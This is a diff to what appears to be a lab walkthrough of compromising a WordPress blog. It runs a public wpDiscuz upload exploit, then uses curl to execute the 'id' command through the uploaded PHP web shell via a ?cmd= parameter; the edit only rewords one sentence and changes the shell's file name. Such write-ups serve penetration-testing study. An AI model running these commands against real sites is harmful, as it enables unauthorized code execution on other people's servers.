@@ -195,8 +195,8 @@ Using [this exploit](https://www.exploit-db.com/exploits/49967):
 ```
 python3 wp_discuz.py -u http://blog.company.local -p /?p=1
 ```
-The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append ?cmd= after the .php extension to run commands which we can see in the exploit script:
+The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append `?cmd=` after the generated php webshell to run commands which we can see in the exploit script:
 ```
-curl -s http://blog.company.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+curl -s http://blog.company.local/wp-content/uploads/2021/08/zeeaygvkeodlgvt-1762181484.7355.php?cmd=id
 ```
 
